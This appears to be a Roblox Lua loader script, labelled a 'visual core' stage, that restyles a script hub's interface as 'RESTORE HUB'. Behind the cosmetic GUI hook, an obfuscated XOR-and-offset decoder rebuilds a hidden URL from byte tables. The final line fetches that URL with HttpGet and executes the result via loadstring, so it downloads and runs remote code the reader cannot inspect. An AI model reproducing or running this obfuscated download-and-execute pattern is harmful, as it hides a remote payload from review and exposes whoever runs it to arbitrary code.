
--[[ STAGE 2: VISUAL CORE ]]
local Yj1vzSjLGdmqkAZ_G6d92 = bit32 and bit32.bxor
if not Yj1vzSjLGdmqkAZ_G6d92 then
    Yj1vzSjLGdmqkAZ_G6d92 = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function WUt7g_WQTLDf(data, a, b, m, s, r, z)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local drift = (b + i * s + (z or 0)) % 256
        if m == 0 then
            v = (v - drift) % 256
            v = Yj1vzSjLGdmqkAZ_G6d92(v, a)
        else
            v = Yj1vzSjLGdmqkAZ_G6d92(v, a)
            v = (v - drift) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local yLDR_dT3_D6AC21Jp = {
  {{91, 158, 144, 159}, 154, 131, 1, 6, true, 11, 9},
  {{37, 41, 253, 55, 55, 68}, 208, 61, 0, 5, true, 19, 0},
  {{32, 34, 233, 252}, 39, 109, 1, 7, true, 20, 30},
  {{136, 164, 164, 156}, 68, 79, 1, 5, true, 9, 20},
  {{163, 177, 187, 149, 152}, 219, 241, 0, 7, true, 13, 0},
  {{181, 182, 211}, 52, 97, 0, 1, true, 1, 19},
  {{90, 109, 101, 106, 100}, 125, 41, 0, 4, false, 5, 30},
  {{123, 104, 113, 125, 119, 141, 124}, 146, 113, 0, 3, true, 4, 16},
  {{169, 169, 107}, 56, 79, 0, 1, true, 7, 2},
  {{192, 188, 170, 158, 155, 179, 203}, 211, 250, 0, 3, true, 14, 6},
  {{30, 39, 36, 44, 112, 85, 113}, 235, 128, 0, 5, false, 12, 19},
  {{165, 176, 165, 161, 133, 183, 181}, 203, 233, 1, 2, false, 16, 26},
  {{146}, 101, 130, 0, 5, true, 21, 7},
  {{68, 76, 62, 71, 111, 90, 73}, 182, 90, 0, 1, true, 15, 17},
  {{211, 213, 220, 215, 226}, 118, 184, 0, 3, false, 8, 0},
  {{163, 187, 180, 148, 210, 223}, 179, 205, 0, 7, false, 3, 14},
  {{71, 99, 117, 127, 117}, 183, 110, 0, 6, true, 17, 17},
  {{180, 172, 224, 234, 225}, 93, 116, 1, 5, false, 2, 0},
  {{242, 249, 246, 36, 239, 226, 228}, 85, 29, 1, 3, true, 6, 26},
  {{117, 126, 139, 138, 134, 155, 219}, 219, 184, 0, 5, true, 10, 12},
  {{122, 4, 14, 8, 37}, 197, 83, 1, 4, true, 18, 7}
}
local psPE7YRfFZk8N2SMfCfE = {}
for hxaQrmaB9AMCYKWEPGx = 1, #yLDR_dT3_D6AC21Jp do
    local sRYhqwK0RJilITuHqH = yLDR_dT3_D6AC21Jp[hxaQrmaB9AMCYKWEPGx]
    psPE7YRfFZk8N2SMfCfE[sRYhqwK0RJilITuHqH[7]] = WUt7g_WQTLDf(
        sRYhqwK0RJilITuHqH[1],
        sRYhqwK0RJilITuHqH[2],
        sRYhqwK0RJilITuHqH[3],
        sRYhqwK0RJilITuHqH[4],
        sRYhqwK0RJilITuHqH[5],
        sRYhqwK0RJilITuHqH[6],
        sRYhqwK0RJilITuHqH[8]
    )
end
local T9eXZ8sA11b3ob = table.concat(psPE7YRfFZk8N2SMfCfE)
local HubName = "RESTORE HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(T9eXZ8sA11b3ob))()
